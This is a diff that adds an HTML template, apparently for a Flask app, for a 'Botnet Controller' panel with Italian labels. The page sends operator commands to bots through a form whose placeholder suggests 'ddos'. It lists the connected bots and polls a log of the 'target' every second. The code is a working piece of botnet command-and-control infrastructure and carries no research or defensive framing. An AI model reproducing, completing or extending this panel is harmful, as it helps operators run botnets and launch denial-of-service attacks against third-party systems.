@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Botnet GUI</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        input { padding: 8px; }
+        button { padding: 8px 12px; }
+        ul { padding-left: 20px; }
+        #log { margin-top: 20px; background: #eee; padding: 10px; max-height: 300px; overflow-y: scroll; }
+    </style>
+    <script>
+        function fetchLogs() {
+            fetch('/logs')
+                .then(response => response.text())
+                .then(data => {
+                    document.getElementById('log').innerText = data;
+                });
+        }
+
+        setInterval(fetchLogs, 1000); // aggiornamento ogni secondo
+        window.onload = fetchLogs;
+    </script>
+    <script>
+        function clearLogs() {
+            fetch('/clear_logs', { method: 'POST' })
+            .then(response => response.text())
+            .then(data => alert(data))
+            .catch(error => alert("Errore: " + error));
+}
+
+    </script>
+</head>
+<body>
+    <h1>Botnet Controller</h1>
+    <form action="/send_command" method="POST">
+        <input type="text" name="command" placeholder="Comando (es. ddos)" required>
+        <button type="submit">Invia</button>
+    </form>
+
+    <h2>Bot connessi:</h2>
+    <ul>
+        {% for bot in bots %}
+        <li>{{ bot }}</li>
+        {% endfor %}
+    </ul>
+
+    <h2>Log del bersaglio (target):</h2>
+    <div id="log"></div>
+    <div>
+        <button onclick="clearLogs()">Pulisci Log</button>
+    </div>
+</body>
+</html>
